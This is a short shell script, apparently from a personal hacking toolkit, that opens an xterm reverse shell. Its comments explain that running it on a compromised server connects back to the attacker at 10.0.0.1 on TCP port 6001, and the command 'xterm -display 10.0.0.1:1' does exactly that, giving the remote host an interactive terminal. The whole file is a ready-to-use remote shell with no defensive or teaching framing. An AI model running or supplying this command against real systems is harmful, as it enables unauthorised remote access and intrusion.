#!/bin/sh
## Powered by Jasutin
## One of the simplest forms of reverse shell is an xterm session.
## The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.

clear;

printf "\nX-Server running on [port] 6001 ..."

xterm -display 10.0.0.1:1
